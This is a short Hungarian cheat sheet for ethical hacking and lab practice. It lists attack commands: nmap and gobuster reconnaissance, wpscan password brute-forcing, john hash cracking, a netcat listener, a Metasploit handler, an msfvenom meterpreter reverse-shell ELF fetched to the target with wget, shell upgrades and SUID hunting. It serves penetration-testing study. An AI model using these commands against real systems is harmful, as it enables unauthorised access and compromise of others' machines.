# Etikus hackelés cheat-sheet

## Alapvető paracsok:

- `ping $RHOST`
- `sudo nmap -sS -sV -O -sC $RHOST` esetleg, ha ismerjük (-p PORT)
- `gobuster dir -u http://$RHOST -w /usr/share/wordlists/dirb/common.txt` vagy `/usr/share/wordlists/dirb/big.txt`
  Gobuster helyett lehet dirb-t is használni: `dirb http://$RHOST {megfeleő szólista} (-r)`, ahol a -r kikapcsolja a rekurzív keresést

## Wordpress esetén:

- `wpscan --url http://$RHOST --userames {filename} --passwords {filename}` -(itt lehet használni pl.: usr/share/wordlists/rockyou.txt)
- Ha kapunk egy hash-t:
- Hash típusának meghatározása: `hash-identifier`
- Hash feltörése: `john {filename} --format={az előbb meghatározott típus, pl.: raw-md5} --wordlists=/usr/share/wordlists/dirb/rockyou.txt`

## Netcat listener készítése:

- `nc -lvnp 5555` (5555=PORT, ez lehet más is)

## Msfconsole multi/handler:

- `>> set payload linux/x64/meterpreter_reverse_tcp`
- `set lhost $LHOST`
- `set rhost $RHOST`
- `set lport 5555`
- `run`

#### Ha kaptunk meterpreter shell-t, akkor egyszerűen az `upload` és `download` parancsokat használhatjuk

## Interaktív shell készítése:

- Ha van python a célgépen: `python -c "import pty; pty.spawn('/bin/bash')"`, de más eszközök is rendelkezésre állnak a gépen elérhető programok függvényében pl.: `perl`. Ha találunk valami ilyesmit, akkor érdemes lecsekkolni a [gtfobins](https://gtfobins.github.io/#python)-en.

## SUID bitek keresése:

- `find / -perm /u=s 2>/dev/null`

## Shell kódok készítése msfvenommal:

- `msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=$LHOST RHOST=$RHOST LPORT=5555 -f elf > revshell.elf`
- Ha pl. windowsos célgépet támadunk akkor az .elf kiterjesztés helyett a .exe kiterjesztést használjuk.

## SSH alapok:

- Eszközhöz való csatlakozás: `ssh -p PORT username@$RHOST`
- Eszközhöz való csatlakozás privát kulcs használatával: `ssh -p PORT -i {privát kulcs} username@$RHOST`, viszont ekkor a privát kulcs publikus párjána szerepelnie kell a felhasználó `~/.ssh/authorized keys` fájljában.

## Privát kulcs készítése:

- `openssl genpkey –algorithm RSA -pkeyopt rsa_keygen_bits:2048 > privat.pem` vagy `ssh-keygen -t rsa -b 2048`

## Publikus kulcs készítése privátból:

- `ssh-keygen -f privat.pem -y > publikus.pub`

## Python szerver:

- `python3 -m http.server`
- Letöltés a szerverről: `wget http://$RHOST:8000/revshell.elf`

## A sudo parancs:

- `sudo -l`
- Futtatás más felhasználó nevében (pl.: SUID bitünk van): `sudo -u username ...parancsok`

## Szkriptelés:

- Szkriptek elejére: `#!/bin/zsh` vagy `#!/bin/bash`
- Hasznos oldal lehet még a [pentestmonkey](https://pentestmonkey.net/category/cheat-sheet) is
